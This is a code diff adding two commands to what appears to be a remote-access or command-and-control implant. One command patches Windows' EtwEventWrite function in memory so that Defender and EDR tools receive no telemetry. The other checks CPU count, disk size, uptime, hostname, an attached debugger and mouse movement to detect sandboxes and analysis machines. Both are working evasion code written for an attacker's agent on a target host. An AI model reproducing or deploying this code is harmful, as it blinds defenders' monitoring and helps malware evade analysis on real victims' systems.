@@ -747,3 +747,131 @@ def _beacon_sleep(conn, args: list[str]) -> str:
         return f"[+] Beacon sleep set to {secs}s"
     except Exception as exc:
         return f"[-] beacon_sleep: {exc}"
+
+
+# ---------------------------------------------------------------------------
+# ETW patch (post-session, in-process)
+# ---------------------------------------------------------------------------
+
+@_register("etw_patch")
+def _etw_patch(conn, args: list[str]) -> str:
+    """
+    Patch EtwEventWrite in ntdll.dll to return immediately (0xC3 RET).
+
+    Prevents Windows Defender and EDR solutions from receiving ETW telemetry
+    events for this process — covers script execution, .NET load, WMI, and
+    registry activity.
+
+    Windows-only.  Safe to call multiple times (idempotent).
+    """
+    if sys.platform != "win32":
+        return "[-] etw_patch is Windows-only"
+    try:
+        import ctypes as _ct
+        k32  = _ct.windll.kernel32
+        nt   = k32.LoadLibraryA(b"ntdll.dll")
+        addr = _ct.cast(
+            k32.GetProcAddress(nt, b"EtwEventWrite"),
+            _ct.c_void_p
+        ).value
+        if not addr:
+            return "[-] EtwEventWrite not found"
+        old = _ct.c_ulong(0)
+        k32.VirtualProtect(_ct.c_void_p(addr), _ct.c_size_t(8), 0x40, _ct.byref(old))
+        _ct.cast(addr, _ct.POINTER(_ct.c_ubyte))[0] = 0xC3  # RET
+        k32.VirtualProtect(_ct.c_void_p(addr), _ct.c_size_t(8), old, _ct.byref(old))
+        return "[+] EtwEventWrite patched (RET stub) — ETW telemetry disabled for this process"
+    except Exception as exc:
+        return f"[-] etw_patch failed: {exc}"
+
+
+# ---------------------------------------------------------------------------
+# Sandbox / VM detection check (post-session diagnostic)
+# ---------------------------------------------------------------------------
+
+@_register("sandbox_check")
+def _sandbox_check(conn, args: list[str]) -> str:
+    """
+    Run the sandbox/VM detection checks and report what is found.
+
+    Returns a report of each check result — useful to verify the agent is
+    running on a real target, not in a sandbox.  Does NOT exit on detection;
+    use the ``sandbox_detect`` payload encoder to auto-exit at startup.
+    """
+    results: list[str] = []
+
+    # CPU cores
+    try:
+        import multiprocessing as _mp
+        cpus = _mp.cpu_count()
+        flag = " ⚠ (sandbox indicator)" if cpus < 2 else ""
+        results.append(f"  CPU cores    : {cpus}{flag}")
+    except Exception as e:
+        results.append(f"  CPU cores    : error ({e})")
+
+    # Disk size
+    try:
+        import shutil as _sh
+        root  = "C:\\" if sys.platform == "win32" else "/"
+        total = _sh.disk_usage(root).total
+        gb    = total / (1024 ** 3)
+        flag  = " ⚠ (sandbox indicator)" if gb < 60 else ""
+        results.append(f"  Disk ({root})  : {gb:.1f} GB{flag}")
+    except Exception as e:
+        results.append(f"  Disk         : error ({e})")
+
+    # Uptime
+    try:
+        if sys.platform == "win32":
+            import ctypes as _ct
+            up = _ct.windll.kernel32.GetTickCount64() / 1000
+        else:
+            with open("/proc/uptime") as _f:
+                up = float(_f.read().split()[0])
+        flag = " ⚠ (fresh boot — possible sandbox)" if up < 480 else ""
+        results.append(f"  Uptime       : {up:.0f}s ({up/60:.1f} min){flag}")
+    except Exception as e:
+        results.append(f"  Uptime       : error ({e})")
+
+    # Hostname
+    try:
+        import platform as _pl
+        hn   = _pl.node()
+        bads = ("SANDBOX", "CUCKOO", "VBOX", "VMWARE", "ANALYSIS", "MALWARE", "VIRUS")
+        flag = " ⚠ sandbox hostname" if any(b in hn.upper() for b in bads) else ""
+        results.append(f"  Hostname     : {hn}{flag}")
+    except Exception as e:
+        results.append(f"  Hostname     : error ({e})")
+
+    # Debugger (Windows)
+    if sys.platform == "win32":
+        try:
+            import ctypes as _ct
+            dbg = bool(_ct.windll.kernel32.IsDebuggerPresent())
+            flag = " ⚠ DEBUGGER ATTACHED" if dbg else ""
+            results.append(f"  Debugger     : {'yes' if dbg else 'no'}{flag}")
+        except Exception as e:
+            results.append(f"  Debugger     : error ({e})")
+
+    # Mouse activity (Windows)
+    if sys.platform == "win32":
+        try:
+            import ctypes as _ct
+            import time as _t
+
+            class _POINT(_ct.Structure):
+                _fields_ = [("x", _ct.c_long), ("y", _ct.c_long)]
+
+            p1 = _POINT()
+            _ct.windll.user32.GetCursorPos(_ct.byref(p1))
+            _t.sleep(5)
+            p2 = _POINT()
+            _ct.windll.user32.GetCursorPos(_ct.byref(p2))
+            moved = (p1.x != p2.x or p1.y != p2.y)
+            flag  = "" if moved else " ⚠ no mouse movement (possible sandbox)"
+            results.append(f"  Mouse moved  : {'yes' if moved else 'no'}{flag}")
+        except Exception as e:
+            results.append(f"  Mouse moved  : error ({e})")
+
+    header = "[*] Sandbox detection report:"
+    return header + "\n" + "\n".join(results)
